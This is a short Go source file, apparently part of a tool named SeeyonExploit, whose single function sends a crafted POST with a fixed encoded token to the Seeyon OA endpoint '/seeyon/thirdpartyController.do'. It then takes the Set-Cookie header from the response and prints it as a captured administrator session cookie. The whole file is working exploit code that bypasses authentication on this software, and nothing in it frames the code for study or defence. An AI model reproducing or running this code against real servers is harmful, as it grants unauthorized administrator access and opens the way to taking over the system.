package SessionGetshell

import (
	"SeeyonExploit/utils"
	"fmt"
)

func GetSession(url string) string {
	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
	header["Accept-Language"] = "zh-CN,zh;q=0.9"
	header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
	header["Upgrade-Insecure-Requests"] = "1"
	url = url + "/seeyon/thirdpartyController.do"
	data := `method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1`
	resp := utils.PostData(url, data, header)
	if resp.Header.Values("Set-Cookie") != nil {
		fmt.Println("获取管理员Cookie成功：" + resp.Header.Values("Set-Cookie")[0])
		return resp.Header.Values("Set-Cookie")[0]
	} else {
		return ""
	}
}
